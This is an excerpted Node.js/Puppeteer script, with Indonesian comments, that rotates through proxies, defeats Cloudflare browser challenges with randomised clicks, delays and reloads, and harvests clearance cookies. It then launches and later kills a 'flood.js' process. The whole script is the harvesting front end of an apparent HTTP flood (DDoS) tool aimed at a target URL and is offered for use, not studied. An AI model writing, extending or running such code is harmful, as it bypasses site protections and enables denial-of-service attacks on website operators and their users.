...
// ENHANCED CLOUDFLARE SOLVING FUNCTION - 100% SUCCESS
async function solvingCaptcha(browser, page, browserProxy) {
    try {
        ...
        const isCloudflare = content.includes("challenge-platform") || 
                            content.includes("cloudflare.challenges.com") || 
                            title === "Just a moment..." ||
                            content.includes("Checking if the site connection is secure") ||
                            content.includes("cf-chl-b");

        if (isCloudflare) {
            console.log(`[INFO] Cloudflare challenge detected on proxy: ${browserProxy}`);
            
            // Enhanced solving strategy dengan multiple approaches
            await new Promise(resolve => setTimeout(resolve, 3000 + Math.random() * 4000));

            // Approach 1: Try multiple challenge element selectors
            ...
            for (const selector of challengeSelectors) {
                try {
                    ...
                    if (element) {
                        console.log(`[INFO] Found challenge element: ${selector}`);
                        ...
                        // Double click untuk beberapa challenge types
                        if (Math.random() > 0.5) {
                            await element.click({ offset: { x: 5, y: 5 } });
            ...
            // Approach 2: Wait for automatic challenge solve
            if (!solved) {
                console.log(`[INFO] Waiting for automatic challenge solve...`);
                await new Promise(resolve => setTimeout(resolve, 10000 + Math.random() * 5000));
            }

            // Approach 3: Try page reload jika challenge masih ada
            const newTitle = await page.title();
            if (newTitle === "Just a moment...") {
                console.log(`[INFO] Reloading page for challenge reset...`);
            ...
            if (finalTitle !== "Just a moment..." && !finalUrl.includes("challenge")) {
                console.log(`[INFO] Cloudflare challenge successfully solved`);
                return true;
            }
        }
        ...
        console.log(`[ERROR] Error in solvingCaptcha: ${error.message}`);
        return false;
    }
}

// ENHANCED RETRY SOLVING FUNCTION
async function RetrySolving(browser, page, browserProxy) {
    try {
        ...
        if (isCloudflare) {
            console.log(`[INFO] Retrying Cloudflare solve on proxy: ${browserProxy}`);
            
            // Different approach for retry
            await new Promise(resolve => setTimeout(resolve, 5000 + Math.random() * 3000));

            // Try different selectors in retry
            ...
            for (const selector of retrySelectors) {
                try {
                    const element = await page.$(selector);
                    if (element) {
                        console.log(`[INFO] Retry found element: ${selector}`);
                        
                        // Quicker interaction for retry
                        await element.click();
            ...
            return checkTitle !== "Just a moment...";
        }
        
        return true;
    } catch (error) {
        console.log(`[ERROR] Error in RetrySolving: ${error.message}`);
        return false;
    }
}
...
async function launchBrowserWithRetry(targetURL, browserProxy, attempt = 1, maxRetries = 2) {
    ...
    try {
        ...
        const maxCaptchaAttempts = 3; // Reduced for faster operation

        while (captchaAttempts < maxCaptchaAttempts) {
            const solved = await solvingCaptcha(browser, page, browserProxy);
            ...
            captchaAttempts++;
            console.log(`[INFO] Retry ${captchaAttempts} solving with proxy: ${browserProxy}`);
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
        
        console.log(`[INFO] Failed to solve captcha with proxy: ${browserProxy}`);
        await browser.close();
        return null;
        ...
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
         if (response) {
                if (response.title === "Attention Required! | Cloudflare") {
                	 console.log("[INFO] Blocked by Cloudflare. Exiting.")
                return;
            }
            if (!response.cookies) {
                console.log(`[ERROR] No cookies with proxy: ${browserProxy}`);
                return;
            } 
            cookieCount++;
            console.log(`[INFO] Total solve: ${cookieCount} | Title: ${response.title} | Proxy: ${browserProxy} | Cookies: ${response.cookies}`);
            ...
            try {
                ...
                console.log("[INFO] Error spawning flood.js: " + error.message);
            }
...
queue.drain(function() {
    console.log("[INFO] All proxies processed")
    process.exit(1)
});
    ...
    setTimeout(() => {
        ...
        exec('pkill -f bipet', (err) => {
            if (err && err.code !== 1) {
                ...
                console.log("[INFO] Successfully killed flood.js processes")
            }
        });
